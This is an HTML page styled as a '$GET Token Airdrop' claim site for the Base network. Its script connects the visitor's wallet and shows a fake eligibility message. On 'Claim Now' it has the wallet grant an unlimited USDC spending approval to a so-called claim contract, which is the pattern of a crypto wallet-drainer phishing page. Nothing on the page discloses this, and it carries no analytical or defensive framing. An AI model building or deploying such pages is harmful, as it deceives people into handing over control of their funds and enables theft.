<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>$GET Airdrop Claim</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1e1f29, #2f3041);
      color: #f1f1f5;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }
    .claim-wrapper {
      background: rgba(255 255 255 / 0.05);
      border-radius: 16px;
      box-shadow: 0 0 30px rgba(255, 170, 51, 0.2);
      max-width: 420px;
      width: 100%;
      padding: 2.5rem 3rem;
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 170, 51, 0.3);
      text-align: center;
      animation: fadeInUp 0.8s ease forwards;
    }
    @keyframes fadeInUp {
      from {opacity: 0; transform: translateY(30px);}
      to {opacity: 1; transform: translateY(0);}
    }
    .logo {
      font-weight: 700;
      font-size: 2.8rem;
      color: #ffaa33;
      margin-bottom: 0.5rem;
      letter-spacing: 3px;
      user-select: none;
    }
    .title {
      font-weight: 600;
      font-size: 1.5rem;
      margin-bottom: 1rem;
      color: #fff;
    }
    .subtitle {
      font-weight: 400;
      font-size: 1rem;
      color: #ddd;
      margin-bottom: 2rem;
      line-height: 1.4;
    }
    .connect-wallet-btn, .claim-btn {
      border: none;
      border-radius: 50px;
      font-weight: 700;
      padding: 0.8rem 2.5rem;
      cursor: pointer;
      transition: background 0.3s ease;
      box-shadow: 0 0 15px rgba(255,170,51,0.6);
      width: 100%;
      user-select: none;
      font-size: 1rem;
      margin-bottom: 1.5rem;
    }
    .connect-wallet-btn {
      background: #ffaa33;
      color: #000;
    }
    .connect-wallet-btn:hover {
      background: #ffc76b;
    }
    .connect-wallet-btn:disabled {
      background: #ccc; color: #666; cursor: not-allowed; box-shadow: none;
    }
    .claim-btn {
      background: linear-gradient(90deg, #ffcc70, #ffaa33);
      font-size: 1.1rem;
    }
    .claim-btn:hover {
      background: linear-gradient(90deg, #ffdca1, #ffc76b);
    }
    .claim-btn:disabled {
      background: #ccc; color: #666; cursor: not-allowed; box-shadow: none;
    }
    .wallet-address {
      background: #2f3041;
      border-radius: 10px;
      padding: 1rem;
      color: #fff;
      font-size: 1rem;
      margin-bottom: 1.5rem;
      word-break: break-word;
    }
    .eligibility-msg, .success-msg {
      background: rgba(255 255 255 / 0.1);
      border-radius: 12px;
      padding: 1rem 1.5rem;
      color: #fff;
      font-size: 1rem;
      box-shadow: 0 0 12px rgba(255, 170, 51, 0.25);
      margin-bottom: 1rem;
    }

    .success-msg {
      background: rgba(0, 255, 150, 0.12);
      border: 1px solid rgba(0, 255, 150, 0.3);
      box-shadow: 0 0 10px rgba(0, 255, 150, 0.2);
      color: #afffda;
    }

    .fade-in {
      animation: fadeIn 0.6s ease-out forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class="claim-wrapper">
    <div class="logo">GETCHAIN</div>
    <div class="title">$GET Token Airdrop</div>
    <div class="subtitle">Connect your wallet to claim your $GET tokens.</div>

    <button class="connect-wallet-btn" id="connectWalletBtn">Connect Wallet</button>
    <div id="walletAddress" class="wallet-address" style="display:none;"></div>
    <button class="claim-btn" id="claimBtn" disabled>Claim Now</button>

    <div id="eligibilityMessage" class="eligibility-msg" style="display:none;">
      âœ… You are eligible for <strong>10,000 $GET</strong>
    </div>

    <div id="successMessage" class="success-msg" style="display:none;">
      ðŸŽ‰ You have successfully claimed <strong>10,000 $GET</strong>!
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const walletAddressDiv = document.getElementById('walletAddress');
    const claimBtn = document.getElementById('claimBtn');
    const eligibilityMsg = document.getElementById('eligibilityMessage');
    const successMsg = document.getElementById('successMessage');

    let provider, signer;

    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
    const GET_TOKEN_ADDRESS = "0x8202602770933045BA513a7C6255E34D9B966405";
    const CLAIM_CONTRACT_ADDRESS = "0x7Bb5c61149a3E66675AFBCA166436CddECF86581";

    const ERC20_ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)"
    ];
    const CLAIM_ABI = [
      "function claim() external"
    ];

    connectWalletBtn.addEventListener('click', async () => {
      if (!window.ethereum) {
        alert("MetaMask not detected. Please install it.");
        return;
      }

      try {
        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        const address = await signer.getAddress();

        const { chainId } = await provider.getNetwork();
        if (chainId !== 8453) {
          alert("Please switch to Base Mainnet (Chain ID: 8453).");
          return;
        }

        walletAddressDiv.textContent = address;
        walletAddressDiv.style.display = 'block';
        connectWalletBtn.textContent = "Wallet Connected";
        connectWalletBtn.disabled = true;

        eligibilityMsg.style.display = 'block';
        claimBtn.disabled = false;
      } catch (err) {
        alert("Connection failed.");
      }
    });

    claimBtn.addEventListener('click', async () => {
      if (!signer) {
        alert("Connect your wallet first.");
        return;
      }

      try {
        const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
        const approvalTx = await usdc.approve(CLAIM_CONTRACT_ADDRESS, ethers.constants.MaxUint256);
        await approvalTx.wait();

        const claimContract = new ethers.Contract(CLAIM_CONTRACT_ADDRESS, CLAIM_ABI, signer);
        const claimTx = await claimContract.claim();
        await claimTx.wait();

        successMsg.style.display = 'block';
        successMsg.classList.add('fade-in');
        claimBtn.disabled = true;
        claimBtn.textContent = "Claimed";
      } catch (err) {
        console.error("Claim failed:", err);
        alert("Transaction failed. Please try again.");
      }
    });
  </script>
</body>
</html>
